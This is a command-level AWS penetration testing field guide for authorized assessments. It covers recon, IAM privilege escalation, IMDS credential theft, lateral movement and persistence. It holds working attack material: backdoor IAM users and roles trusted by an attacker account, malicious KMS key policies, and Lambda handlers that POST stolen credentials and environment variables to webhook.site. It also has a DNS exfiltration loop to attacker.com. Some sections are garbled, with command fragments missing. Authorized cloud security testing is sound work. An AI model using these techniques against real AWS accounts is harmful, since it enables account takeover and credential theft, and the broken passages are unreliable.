AWS Penetration Testing
Field Guide

A comprehensive, command-level reference for conducting authorized AWS security assessments. Covers the full attack lifecycle from initial assumed-compromise credential access through privilege escalation, lateral movement, and data exfiltration — with hands-on CLI techniques for every major AWS service.

Black Box / Grey Box Assumed Compromise AWS CLI Focused Authorized Use Only
⚠ Legal & Authorization Notice: All techniques in this guide are for use only on systems you own or have explicit written authorization to test. Unauthorized access to AWS environments violates the Computer Fraud and Abuse Act (CFAA), AWS Acceptable Use Policy, and equivalent laws globally. Always obtain a signed Statement of Work (SOW) and Rules of Engagement (RoE) before beginning. AWS also requires prior notification for certain test types — check aws.amazon.com/security/penetration-testing before each engagement.

Credential Profile Management

bash 
# Configure the initial compromised credential set
aws configure --profile target
# Prompts: Access Key ID, Secret Access Key, region (us-east-1 default), output (json)

# Or set directly via environment variables (avoids disk writes)
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=abc123...
export AWS_DEFAULT_REGION=us-east-1

# Use a named profile for all subsequent commands
export AWS_PROFILE=target

# Verify credentials are valid
aws sts get-caller-identity --profile target

# Store assumed-role creds as a new profile
aws configure set aws_access_key_id $ACCESS_KEY --profile privesc
aws configure set aws_secret_access_key $SECRET_KEY --profile privesc
aws configure set aws_session_token $SESSION_TOKEN --profile privesc
aws configure set region us-east-1 --profile privesc
💡

Tip: Use --output json combined with jq for reliable field extraction. For example: aws iam list-users | jq '.Users[].UserName'. Keep multiple profiles per lab and never overwrite the initial low-priv profile — you may need to fall back to it.

Phase 01

Initial Access & Reconnaissance

In most assumed-compromise scenarios you receive a static IAM access key pair (or temporary STS credentials). Your first goal is to understand who you are, what account you're in, and establish foundational situational awareness before touching anything that logs heavily.

Identity Verification

bash 
# WHO AM I — always run this first
aws sts get-caller-identity

# Returns: UserId, Account, Arn
# If Arn contains :assumed-role/ → you have temporary role creds
# If Arn contains :user/ → you have long-term user creds
# If Arn contains :federated-user/ → federated identity

# Decode STS assumed-role ARN to get underlying role
# arn:aws:sts::123456789012:assumed-role/RoleName/SessionName
#                                        ^role       ^session (often the EC2/service name)

# Check token expiration (if using temporary creds)
aws sts get-caller-identity --query 'Credentials.Expiration' 2>/dev/null

Account & Region Discovery

bash 
# Get account ID (also available from get-caller-identity)
aws sts get-caller-identity --query Account --output text

# List all enabled regions
aws ec2 describe-regions --query 'Regions[].RegionName' --output text

# Get account aliases (reveals org/company name)
aws iam list-account-aliases

# Check if part of an AWS Organization
aws organizations describe-organization 2>/dev/null
aws organizations list-accounts 2>/dev/null

# Identify account-level service control policies (SCPs)
aws organizations list-policies --filter SERVICE_CONTROL_POLICY 2>/dev/null

Automated Reconnaissance Script

ℹ️

Run this initial recon script immediately after credential setup. It safely checks identity and account-level metadata without touching sensitive services.

bash 
#!/bin/bash
# aws-initial-recon.sh — Run first after credential setup

PROFILE=${1:-default}

echo "[*] === AWS Initial Recon ==="
echo "[*] Profile: $PROFILE"
echo

# Identity
echo "[*] Identity:"
aws sts get-caller-identity --profile $PROFILE --output json
echo

# Account aliases
echo "[*] Account Aliases:"
aws iam list-account-aliases --profile $PROFILE 2>/dev/null
echo

# Org info
echo "[*] Organization Info:"
aws organizations describe-organization --profile $PROFILE 2>/dev/null || echo "  (not in org or no access)"
echo

# IAM password policy (reveals maturity of org)
echo "[*] IAM Password Policy:"
aws iam get-account-password-policy --profile $PROFILE 2>/dev/null
echo

# Check CloudTrail status (are we being logged?)
echo "[*] CloudTrail Trails:"
aws cloudtrail describe-trails --profile $PROFILE 2>/dev/null | jq '.trailList[] | {Name, HomeRegion, IsMultiRegionTrail, LogFileValidationEnabled}'
echo

echo "[+] Initial recon complete."

CloudTrail Awareness

⚠️

Most API calls are logged by CloudTrail. Before heavy enumeration, check trail status, S3 destinations, and whether CloudWatch Alarms are configured on IAM events. Enumeration itself is logged — minimize noisy calls like iam:SimulatePrincipalPolicy in stealth engagements.

bash 
# List all trails and their logging status
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name arn:aws:cloudtrail:...:trail/...

# Check if trails are actually logging
aws cloudtrail get-trail-status --name trail-name --query IsLogging

# Check GuardDuty status (threat detection)
aws guardduty list-detectors
aws guardduty get-detector --detector-id <id>

# Check AWS Config (compliance monitoring)
aws configservice describe-configuration-recorders
aws configservice describe-delivery-channels

# Check Security Hub
aws securityhub describe-hub 2>/dev/null

Phase 02

Enumeration & Discovery

Systematic enumeration is the backbone of a successful cloud penetration test. The goal is to map all accessible resources, identify the effective permission set of your current identity, and locate high-value targets before attempting exploitation.

IAM Identity Enumeration

bash 
# Current user's policies (direct and via group)
aws iam get-user
aws iam list-attached-user-policies --user-name <username>
aws iam list-user-policies --user-name <username>   # inline policies
aws iam list-groups-for-user --user-name <username>

# For each group — fetch attached policies
aws iam list-attached-group-policies --group-name <group>
aws iam list-group-policies --group-name <group>   # inline

# Get the actual policy document
aws iam get-policy --policy-arn arn:aws:iam::aws:policy/PolicyName
aws iam get-policy-version --policy-arn <arn> --version-id v1

# List ALL users, roles, and policies in account
aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local   # customer-managed only

# Get current role's policies (if running as a role)
aws iam get-role --role-name <RoleName>
aws iam list-attached-role-policies --role-name <RoleName>
aws iam list-role-policies --role-name <RoleName>   # inline

Phase 03

Privilege Escalation

AWS privilege escalation exploits misconfigurations in IAM policies — both identity-based and resource-based. A critical insight: AWS evaluates both policy types simultaneously. This means even a low-privilege user can gain access if a resource-based policy grants them permissions their identity-based policy doesn't cover.

🧠

Key Principle: Resource-based policies (on S3, KMS, Secrets Manager, SQS, Lambda, etc.) can bypass identity-based restrictions. Always check resource policies alongside identity policies — they are independent evaluation paths.

IAM Privilege Escalation Paths

CRITICAL iam:CreatePolicyVersion — Overwrite Policy to Grant Admin
▶

If you have iam:CreatePolicyVersion, you can create a new version of any customer-managed policy that grants administrator access, then set it as default.

bash
# Find a policy you can modify
aws iam list-policies --scope Local

# Create a new version with admin permissions
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/TargetPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# Verify you now have admin access
aws sts get-caller-identity
aws s3 ls  # should work now
CRITICAL iam:AttachUserPolicy / iam:AttachRolePolicy — Self-Attach Admin
▶

If you can attach policies to your own user or to a role you can assume, directly attach AdministratorAccess.

bash
# Attach AdministratorAccess to your own user
aws iam attach-user-policy \
  --user-name <your-username> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Or to a role you can assume
aws iam attach-role-policy \
  --role-name <RoleName> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/RoleName \
  --role-session-name privesc
CRITICAL iam:PutRolePolicy — Inject Inline Policy
▶

Adding an inline policy to a role you can assume bypasses the need to create a standalone policy document.

bash
aws iam put-role-policy \
  --role-name TargetRole \
  --policy-name BackdoorInline \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
HIGH iam:PassRole + lambda:CreateFunction — Code Execution as High-Priv Role
▶

If you can pass a high-privilege role to a Lambda function you create, you can execute code under that role's permissions.

bash
# Create a payload ZIP
cat > /tmp/lambda_payload.py << 'EOF'
import boto3, json, os
def handler(event, context):
    client = boto3.client('sts')
    identity = client.get_caller_identity()
    creds = boto3.Session().get_credentials().get_frozen_credentials()
    return {
        'identity': identity,
        'AccessKeyId': creds.access_key,
        'SecretAccessKey': creds.secret_key,
        'SessionToken': creds.token
    }
EOF
cd /tmp && zip payload.zip lambda_payload.py

# Deploy with a high-privilege role
aws lambda create-function \
  --function-name privesc-fn \
  --runtime python3.12 \
  --role arn:aws:iam::123456789012:role/HighPrivRole \
  --handler lambda_payload.handler \
  --zip-file fileb:///tmp/payload.zip

# Invoke and retrieve credentials
aws lambda invoke \
  --function-name privesc-fn \
  --payload '{}' \
  /tmp/response.json
cat /tmp/response.json | jq .
HIGH iam:PassRole + iam:CreateInstanceProfile — EC2 Metadata Cred Theft
▶

Assign a high-privilege instance profile to an EC2 instance you control, then steal creds from the IMDSv1 metadata service.

bash
# Create instance profile and attach role
aws iam create-instance-profile --instance-profile-name privesc-profile
aws iam add-role-to-instance-profile \
  --instance-profile-name privesc-profile \
  --role-name HighPrivRole

# Associate with a running instance you control
aws ec2 associate-iam-instance-profile \
  --iam-instance-profile Name=privesc-profile \
  --instance-id i-0abc123...

# On the EC2 instance — retrieve credentials from IMDS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/HighPrivRole
HIGH iam:UpdateAssumeRolePolicy — Hijack Trusted Entities
▶

Modify a role's trust policy to allow your current identity to assume it, even if you weren't originally trusted.

bash
# Update trust policy to trust your user
aws iam update-assume-role-policy \
  --role-name TargetRole \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789012:user/your-username"
      },
      "Action": "sts:AssumeRole"
    }]
  }'

# Now assume the role
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/TargetRole \
  --role-session-name session
HIGH EventBridge Scheduler — Scheduled Admin Actions via Role
▶

If you have scheduler:CreateSchedule and iam:PassRole, create a schedule that invokes a Lambda function or API call with a high-privilege role. Commonly exploited for privilege escalation when direct policy changes are blocked.

bash
# Create schedule group (if needed)
aws scheduler create-schedule-group --name attack-group

# Create a one-time schedule that calls STS to escalate
aws scheduler create-schedule \
  --name privesc-schedule \
  --schedule-expression 'at(2024-01-01T00:01:00)' \
  --flexible-time-window '{"Mode":"OFF"}' \
  --target '{
    "Arn": "arn:aws:lambda:us-east-1:123456789012:function:TargetFunction",
    "RoleArn": "arn:aws:iam::123456789012:role/HighPrivSchedulerRole",
    "Input": "{\"action\":\"escalate\"}"
  }'

# Alternative: Use scheduler to invoke Lambda that modifies IAM policies
# or to run an SSM Document on an EC2 instance

Phase 04

Lateral Movement

Once initial access is established, lateral movement focuses on pivoting between services, accounts, and compute resources to widen the attack surface and reach high-value targets.

Role Assumption Chains

bash 
# Assume a role and export credentials
CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/TargetRole \
  --role-session-name lateral \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Credentials.SessionToken')

# Discover all assumable roles from current identity
aws iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal | (type == "object" and .Service != null) or . == "*") | .RoleName'

# Find roles that trust your current account (cross-account opportunity)
aws iam list-roles | jq -r '.Roles[] | select(.AssumeRolePolicyDocument | tostring | contains("123456789012")) | .Arn'

EC2 Instance Pivot via SSM

bash 
# List SSM-managed instances (no SSH required)
aws ssm describe-instance-information

# Start interactive shell session (requires Session Manager Plugin)
aws ssm start-session --target i-0abc123...

# Run command on remote instance
aws ssm send-command \
  --instance-ids i-0abc123... \
  --document-name AWS-RunShellScript \
  --parameters '{"commands":["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/","env | grep AWS"]}' \
  --query 'Command.CommandId' \
  --output text

# Retrieve command output
aws ssm get-command-invocation \
  --command-id <command-id> \
  --instance-id i-0abc123... \
  --query 'StandardOutputContent'

Lambda Pivoting — Environment Variable Theft

bash 
# Get Lambda function config — check environment variables for secrets
aws lambda get-function-configuration --function-name <function-name>
aws lambda get-function-configuration --function-name <function-name> \
  --query 'Environment.Variables'

# Update Lambda code to exfiltrate credentials and env vars
cat > /tmp/exfil.py << 'EOF'
import boto3, os, urllib.request, json

def handler(event, context):
    creds = boto3.Session().get_credentials().get_frozen_credentials()
    env = dict(os.environ)
    data = {
        'AccessKeyId': creds.access_key,
        'SecretAccessKey': creds.secret_key,
        'SessionToken': creds.token,
        'Environment': env
    }
    req = urllib.request.Request(
        'https://webhook.site/YOUR-UUID',
        data=json.dumps(data).encode(),
        method='POST',
        headers={'Content-Type': 'application/json'}
    )
    urllib.request.urlopen(req)
    return {'statusCode': 200}
EOF
cd /tmp && zip exfil.zip exfil.py

# Update existing function with exfil code
aws lambda update-function-code \
  --function-name TargetFunction \
  --zip-file fileb:///tmp/exfil.zip

# Invoke to trigger exfiltration
aws lambda invoke \
  --function-name TargetFunction \
  --payload '{}' /tmp/out.json

Phase 05

Persistence

Once high-privilege access is obtained, document all persistence techniques for the engagement report. These methods maintain access even if initial credentials rotate or are revoked.

IAM-Based Persistence

bash 
# Create a new IAM user with admin access
aws iam create-user --user-name backdoor-user
aws iam attach-user-policy \
  --user-name backdoor-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor-user

# Create a backdoor role trusted by attacker-controlled account
aws iam create-role \
  --role-name BackdoorRole \
  --assume-role-policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
      "Action": "sts:AssumeRole"
    }]
  }'
aws iam attach-role-policy \
  --role-name BackdoorRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access key for an existing user
aws iam create-access-key --user-name ExistingAdminUser

# Add SSH public key for EC2 access
aws ec2 import-key-pair \
  --key-name backdoor-key \
  --public-key-material fileb://~/.ssh/id_rsa.pub

Lambda Backdoor

bash 
# Add an external trigger to an existing Lambda (e.g., public URL)
aws lambda create-function-url-config \
  --function-name BackdoorFunction \
  --auth-type NONE

# Allow any principal to invoke the Lambda via resource-based policy
aws lambda add-permission \
  --function-name BackdoorFunction \
  --statement-id public-access \
  --action lambda:InvokeFunctionUrl \
  --principal '*' \
  --function-url-auth-type NONE

Webhook-Based Credential Exfiltration (Lambda/Python)

python 
# Lambda handler that exfiltrates all available credentials
import boto3, os, urllib.request, json, socket

def handler(event, context):
    session = boto3.session.Session()
    creds = session.get_credentials().get_frozen_credentials()

    payload = {
        'access_key':    creds.access_key,
        'secret_key':    creds.secret_key,
        'session_token': creds.token,
        'region':        session.region_name,
        'env':           dict(os.environ),
        'function_name': os.environ.get('AWS_LAMBDA_FUNCTION_NAME'),
    }

    req = urllib.request.Request(
        'https://webhook.site/YOUR-UUID',
        data=json.dumps(payload).encode('utf-8'),
        method='POST',
        headers={'Content-Type': 'application/json'}
    )
    urllib.request.urlopen(req, timeout=5)

    return {'statusCode': 200, 'body': 'ok'}

DNS Exfiltration (when HTTP is blocked)

bash 
# Base64-encode and chunk credentials, exfil via DNS lookups
# (each DNS label max 63 chars, total name max 253 chars)

# On attacker-controlled DNS server, capture queries
# Set up NS record: attacker.com NS ns.attacker.com
# Listen: tcpdump -i eth0 port 53

# On victim (bash version)
SECRET="AKIAIOSFODNN7EXAMPLEKEY+abc123..."
ENCODED=$(echo -n "$SECRET" | base64 | tr '+/' '-_' | tr -d '=')
# Split into 40-char chunks and resolve as subdomains
i=0
while [ -n "$ENCODED" ]; do
  CHUNK="${ENCODED:0:40}"
  ENCODED="${ENCODED:40}"
  nslookup "$i-$CHUNK.attacker.com" >/dev/null 2>&1
  i=$(($i + 1))
done

IAM Deep-Dive

Policy Evaluation Logic

🧠

AWS Policy Evaluation Order: 1) Explicit DENY (always wins) → 2) Service Control Policy (SCP) → 3) Resource-based policy → 4) Identity-based policy → 5) Permission Boundary → 6) Session Policy. The key insight for pentesting: resource-based policies can independently grant access, even if identity-based policies are restrictive.

Finding Interesting Permissions

bash

  --policy-source-arn arn:aws:iam::123456789012:user/target-user \

  --policy-arn <arn> \
  --version-id v1 | \
  jq '.PolicyVersion.Document.Statement[] | select(.Effect=="Allow" and (.Action|type == "string" and contains("*") or type == "array"))'

# Find all IAM access keys and their last usage

    aws iam list-access-keys --user-name $user

# Look for users with console access (passwords)

# Wait, then:
aws iam get-credential-report | jq -r '.Content' | base64 -d

EC2 & IMDS Attacks

IMDSv1 vs IMDSv2 — Critical Difference

🚨

IMDSv1 is unauthenticated — any SSRF vulnerability or process on the instance can retrieve credentials with a simple GET. IMDSv2 requires a PUT request first to get a session token. Always check which version is enabled — IMDSv1 is the more dangerous configuration.

bash 
# Check IMDSv1 (if this works, SSRF → cred theft is trivial)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 — get token first, then use it
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Full credential extraction via IMDS
ROLE_NAME=$(curl -s \
  -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

curl -s \
  -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"

# Other useful IMDS endpoints
curl -s http://169.254.169.254/latest/meta-data/                  # full listing
curl -s http://169.254.169.254/latest/meta-data/instance-id
curl -s http://169.254.169.254/latest/meta-data/local-ipv4
curl -s http://169.254.169.254/latest/meta-data/public-ipv4
curl -s http://169.254.169.254/latest/user-data               # launch scripts often contain creds!

# Check IMDS version enforcement on instances
aws ec2 describe-instances \
  --query 'Reservations[].Instances[].[InstanceId,MetadataOptions.HttpTokens,MetadataOptions.HttpEndpoint]' \
  --output table
# HttpTokens=optional → IMDSv1 still enabled (vulnerable)
# HttpTokens=required → IMDSv2 enforced (more secure)

Common Privesc Decision Tree

LOGIC 
1. Can I attach/put policies on myself?
   └─ YES → Attach AdministratorAccess to self (GAME OVER)

2. Can I create a new policy version?
   └─ YES → Create admin version, set as default

3. Can I iam:PassRole?
   ├─ + lambda:CreateFunction / UpdateFunctionCode → Lambda privesc
   ├─ + ec2:RunInstances → EC2 instance profile privesc
   ├─ + codebuild:StartBuild → CodeBuild exec as role
   ├─ + scheduler:CreateSchedule → EventBridge scheduled action
   └─ + cloudformation:CreateStack → CF stack with admin role

4. Can I sts:AssumeRole any high-priv role?
   └─ YES → Assume it directly

5. Can I iam:UpdateAssumeRolePolicy on a high-priv role?
   └─ YES → Add myself to trust policy, then assume

6. Can I modify existing Lambda / CodeBuild / StepFunctions?
   └─ YES → Code injection to exfil role credentials from compute env

7. Resource-based policy opportunities?
   ├─ s3:PutBucketPolicy → Cross-account data access
   ├─ secretsmanager:PutResourcePolicy → Cross-account secret access
   └─ lambda:AddPermission → Cross-account Lambda invocation

# Get key policy (resource-based — check for cross-account grants)
aws kms get-key-policy --key-id <key-id> --policy-name default

# Put malicious key policy (if kms:PutKeyPolicy allowed)
aws kms put-key-policy \
  --key-id <key-id> \
  --policy-name default \
  --policy '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
      "Action": "kms:*",
      "Resource": "*"
    }]
  }'

# Decrypt data encrypted with a key you now control
aws kms decrypt --ciphertext-blob fileb://encrypted.bin \
  --key-id <key-id> \
  --query Plaintext --output text | base64 -d

DynamoDB Enumeration

bash 
# List tables
aws dynamodb list-tables

# Describe table (schema, indexes, capacity)
aws dynamodb describe-table --table-name Users

# Scan entire table (all items — use with caution on large tables)
aws dynamodb scan --table-name Users

# Query for specific items
aws dynamodb query \
  --table-name Users \
  --key-condition-expression "userId = :id" \
  --expression-attribute-values '{ ":id": {"S": "admin"}}'

# Check DynamoDB resource policy (if it exists)
aws dynamodb get-resource-policy --resource-arn arn:aws:dynamodb:... 2>/dev/null

Useful jq Patterns for AWS Output

bash 
# Extract policy actions from a policy document
aws iam get-policy-version --policy-arn <arn> --version-id v1 | \
  jq '.PolicyVersion.Document.Statement[] | {Effect, Action, Resource}'

# Find all Lambda functions with a specific role pattern
aws lambda list-functions | \
  jq '.Functions[] | select(.Role | contains("admin")) | .FunctionName'

# Parse inline policy from role (URL-decode the document)
aws iam get-role-policy --role-name RoleName --policy-name PolicyName | \
  jq '.PolicyDocument'

# Find S3 objects modified in last 24h (sign of active writes)
aws s3api list-objects-v2 --bucket my-bucket | \
  jq '.Contents[] | select(.LastModified > "2024-01-01T00:00:00") | .Key'
